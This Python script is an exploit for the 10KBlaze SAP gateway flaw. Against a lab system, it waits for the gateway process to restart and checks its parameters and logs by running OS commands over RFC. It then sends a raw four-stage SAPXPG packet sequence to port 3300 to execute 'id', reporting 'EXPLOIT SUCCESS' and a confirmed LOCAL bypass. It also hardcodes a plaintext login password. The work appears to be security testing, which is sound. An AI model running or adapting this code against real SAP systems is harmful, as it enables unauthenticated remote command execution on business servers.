#!/usr/bin/env python3
"""
test_after_restart.py — Wait for gwrd to restart, verify params, run SAPXPG.

gwrd was killed (SIGTERM). sapstartsrv should restart it automatically.
After restart, gwrd reads updated DEFAULT.PFL with gw/alternative_hostnames = ubuntu.
"""
import sys, socket, struct, time
sys.path.insert(0, '/home/joris/Desktop/CLAUDE/SAPMAP')

from sap_rfc_ctypes import RFCConnection
from sap_gw_xpg_standalone import (
    build_p1, build_p2, build_p3, build_p4,
    parse_response, ni_send, ni_recv, ni_drain, extract_p4_output,
)

SDK    = '/home/joris/Desktop/nwrfc750P_18-70002752/nwrfcsdk/lib/libsapnwrfc.so'
HOST   = '192.168.2.209'
SYSNR  = '00'
CLIENT = '001'
USER   = 'joris'
PASSWD = 'Schaap123!'

GW_HOST   = '192.168.2.209'
GW_PORT   = 3300
INSTANCE  = '00'
SID       = 'S4H'
HOSTNAME  = 's4hanadev'
KERNEL    = '793_REL'
DEST      = 'T_75'
CLIENT_ID = '000'
COMMAND   = 'id'
TIMEOUT   = 20


def wait_for_gw_port(host, port, timeout=120):
    """Poll TCP port until it accepts connections (gwrd is back)."""
    print(f"[*] Polling {host}:{port} for gwrd restart...")
    start = time.time()
    while time.time() - start < timeout:
        try:
            s = socket.socket()
            s.settimeout(2)
            s.connect((host, port))
            s.close()
            elapsed = time.time() - start
            print(f"[+] GW port {port} accepting connections after {elapsed:.1f}s")
            return True
        except:
            time.sleep(2)
    print(f"[-] GW port {port} not responding after {timeout}s")
    return False


def xpg(conn, prog, params, label):
    print(f"[CMD] {label}")
    kw = dict(TARGET='', DESTINATION='', EXTPROG=prog, PARAMS=params,
              STDINCNTL='R', STDOUTCNTL='M', STDERRCNTL='M', TRACECNTL='0',
              TERMCNTL='C', TRACELEVEL='0', LONG_PARAMS='', CONNCNTL='H')
    try:
        try:
            r = conn.call('SXPG_STEP_XPG_START', MXROW=9999, **kw)
        except Exception as e:
            if 'MXROW' in str(e) or 'RFC_INVALID_PARAMETER' in str(e):
                r = conn.call('SXPG_STEP_XPG_START', **kw)
            else:
                print(f'  [RFC error] {e}'); return None
    except Exception as e:
        print(f'  [call failed] {e}'); return None
    log = r.get('LOG', [])
    lines = []
    for row in log:
        line = (row.get('MESSAGE') or row.get('LINE') or row.get('TEXT') or '').rstrip() \
               if isinstance(row, dict) else str(row).rstrip()
        if line:
            print(f'  {line}')
            lines.append(line)
    if not lines:
        print(f'  (no output)')
    return lines


def run_sapxpg():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(TIMEOUT)
    try:
        sock.connect((GW_HOST, GW_PORT))
    except Exception as e:
        print(f"[-] Connect failed: {e}"); return False

    local_ip = sock.getsockname()[0]
    print(f"[*] Connected from {local_ip}")

    # P1
    try:
        ni_send(sock, build_p1(GW_HOST, INSTANCE))
        resp = ni_recv(sock, TIMEOUT)
        frames = [resp] + ni_drain(sock, 1)
        for f in frames:
            if parse_response(f)['error']:
                print("[P1] REJECTED"); sock.close(); return False
        print(f"[P1] OK")
    except Exception as e:
        print(f"[P1] Error: {e}"); sock.close(); return False

    # P2
    p2 = build_p2(GW_HOST, DEST, local_ip=local_ip, target_hostname=HOSTNAME)
    ni_send(sock, p2)
    conv_id = None; gw_id = 0
    try:
        resp = ni_recv(sock, TIMEOUT)
        frames = [resp] + ni_drain(sock, 1)
        raw = frames[0]
        if len(raw) >= 40:
            appc_rc = struct.unpack("!I", raw[32:36])[0]
            sap_rc  = struct.unpack("!I", raw[36:40])[0]
            print(f"[P2] appc_rc={appc_rc} sap_rc={sap_rc}")
            if appc_rc != 0:
                print(f"[P2] DENIED (appc_rc={appc_rc})")
                sock.close(); return False
        for f in frames:
            info = parse_response(f)
            if info['error']:
                print(f"[P2] err: {info.get('error_msg', '')}"); sock.close(); return False
            if info['conv_id'] and not conv_id:
                conv_id = info['conv_id']
            if info.get('gw_id') is not None:
                gw_id = info['gw_id']
        print(f"[P2] OK: conv_id={conv_id!r} gw_id={gw_id}")
    except socket.timeout:
        print("[P2] timeout"); sock.close(); return False

    if not conv_id: conv_id = '0'
    time.sleep(0.3)

    # P3
    p3 = build_p3(conv_id, GW_HOST, HOSTNAME, SID, INSTANCE,
                  KERNEL, DEST, CLIENT_ID, COMMAND, '', gw_id=gw_id)
    ni_send(sock, p3)
    try:
        resp = ni_recv(sock, TIMEOUT)
        frames = [resp] + ni_drain(sock, 1)
    except socket.timeout:
        print("[P3] timeout"); sock.close(); return False

    p3_out = []
    for f in frames:
        info = parse_response(f)
        if info['error']:
            print(f"[P3] err: {info.get('error_msg', '')}"); sock.close(); return False
        p3_out.extend(extract_p4_output(f))

    if p3_out:
        print(f"\n[+] *** EXPLOIT SUCCESS (P3 output) ***")
        for ln in p3_out: print(f"    {ln}")
        sock.close(); return True

    # P4
    p4 = build_p4(conv_id, GW_HOST, HOSTNAME, SID, INSTANCE,
                  KERNEL, DEST, CLIENT_ID, gw_id=gw_id)
    ni_send(sock, p4)
    try:
        resp = ni_recv(sock, TIMEOUT)
        info = parse_response(resp)
        if info['error']:
            print(f"[P4] err: {info.get('error_msg', '')}"); sock.close(); return False
        output = extract_p4_output(resp)
        if output:
            print(f"\n[+] *** EXPLOIT SUCCESS (P4 output) ***")
            for ln in output: print(f"    {ln}")
            sock.close(); return True
        print("[P4] OK but no output")
    except socket.timeout:
        print("[P4] timeout")

    sock.close()
    return False


def main():
    print("=" * 60)
    print("Post-restart verification and SAPXPG exploit")
    print("=" * 60)

    # Wait for gwrd to come back on port 3300
    if not wait_for_gw_port(GW_HOST, GW_PORT, timeout=120):
        print("[-] GW not responding. May need full system restart.")
        return

    # Extra settling time after port accepts connections
    print("[*] Waiting 10s for GW to fully initialize...")
    time.sleep(10)

    # Open fresh RFC connection and verify
    print("\n[*] Opening fresh RFC connection...")
    try:
        with RFCConnection(sdk_path=SDK, ashost=HOST, sysnr=SYSNR,
                           client=CLIENT, user=USER, passwd=PASSWD, lang='EN') as conn:
            print('[+] RFC connected')

            # Check process list
            xpg(conn, '/usr/sap/S4H/D00/exe/sapcontrol',
                '-nr 00 -function GetProcessList', 'GetProcessList')

            # Verify gw/alternative_hostnames in new gwrd
            xpg(conn, '/usr/sap/S4H/D00/exe/sapcontrol',
                '-nr 00 -function ParameterValue gw/alternative_hostnames',
                'ParameterValue gw/alternative_hostnames')

            # Check gw_log for how "ubuntu" is classified now
            xpg(conn, '/usr/bin/tail',
                '-25 /usr/sap/S4H/D00/work/gw_log-2026-04-11',
                'gw_log: last 25 lines after restart')

            # Also look for alternative_hostnames in gw_log
            xpg(conn, '/usr/bin/grep',
                'alternative /usr/sap/S4H/D00/work/gw_log-2026-04-11',
                'gw_log: alternative_hostnames messages')

    except Exception as e:
        print(f"[-] RFC connection failed: {e}")
        print("[*] Continuing with direct SAPXPG test anyway...")

    # Run SAPXPG
    print("\n" + "=" * 60)
    print("[*] Running SAPXPG from 192.168.2.210...")
    print("=" * 60)
    success = run_sapxpg()

    if success:
        print(f"\n[+] *** 10KBlaze LOCAL bypass CONFIRMED! ***")
        print(f"[+] gw/alternative_hostnames = ubuntu → 192.168.2.210 trusted as LOCAL")
    else:
        print(f"\n[-] SAPXPG still blocked.")


if __name__ == '__main__':
    main()
